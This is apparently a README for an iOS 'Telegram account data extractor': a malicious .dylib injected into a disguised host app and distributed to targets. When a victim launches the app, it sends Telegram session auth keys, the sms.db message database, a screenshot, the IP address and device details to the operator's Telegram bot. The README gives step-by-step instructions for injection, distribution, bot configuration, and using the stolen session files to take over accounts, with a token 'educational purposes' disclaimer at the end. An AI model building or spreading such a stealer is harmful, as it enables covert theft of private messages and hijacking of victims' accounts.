❓ What Is This Tool?

This project is a Telegram account data extractor, with additional capabilities such as retrieving the sms.db file (which contains message history and can be opened using Filza or SQLManager).

🔹 Upon execution of an infected application, it collects the required data and sends it directly to your Telegram.

🔹 It also captures a screenshot of the screen at the moment the infected app is launched and sends that as well.

🔹 It extracts all active session tokens (auth keys) from the device.

⸻

⚙️ Building Guide (After Creating Your .dylib)

To build and package the final version:
	1.	Use Esign or any similar tool.
	2.	Import any app like TGExtra or any app capable of bypassing sandbox restrictions (in TrollStore, these apps are often marked accordingly).
	3.	Inject your .dylib file into the selected application.
	4.	Do not modify anything except the visual design of the host app.
	5.	Once injected, the app will include your “tool” (extractor) and will be ready to distribute.
	6.	Upon execution on a target device, it will send:
	•	A screenshot
	•	atomic-state file
	•	sms.db file
	•	IP address
	•	Timestamp
	•	Device details
	•	iOS version

⸻

📁 How to Access the atomic-state File?
	1.	Open Filza and copy the atomic-state file.
	2.	Tap the multitasking icon (two squares at the bottom right in Telegram).
	3.	Open the Applications tab (bottom left).
	4.	Find your Telegram instance and tap the info icon (!).
	5.	Go to the path:
AppGroups/telegram-data/accounts-metadata/
	6.	You’ll find atomic-state there — it contains your saved sessions/auth keys.
	7.	To avoid overwriting, rename the old file by adding a symbol before replacing it.

This process allows you to switch Telegram accounts using session data.

⸻

📨 What About sms.db?

This file may contain message history. You can open and inspect it with Filza or SQLManager.

⸻

🛠️ Building from Source

If you want to build the project from source, you can use Theos — visit theos.dev for installation and usage instructions.

⸻

🤖 How to Set Up Telegram Bot for Receiving Logs

To ensure that all logs (sessions, files, etc.) are sent directly to your bot:
	1.	Open the project folder.
	2.	Navigate to: IMGUI/imgui.x
	3.	Update the following lines:
NSString *const kBotToken = @"YOUR_TOKEN"; // Get it from @BotFather
NSString *const kChatID = @"YOUR_CHAT_ID_HERE";     // Use @getmyid_bot or Swiftgram settings to get your ID

4.	Don’t forget to start the bot by sending /start.

⸻

⚠️ This tool is intended for educational and research purposes only. Use responsibly and within legal boundaries.

🛠️ Telegram channel https://t.me/SkameykaKit
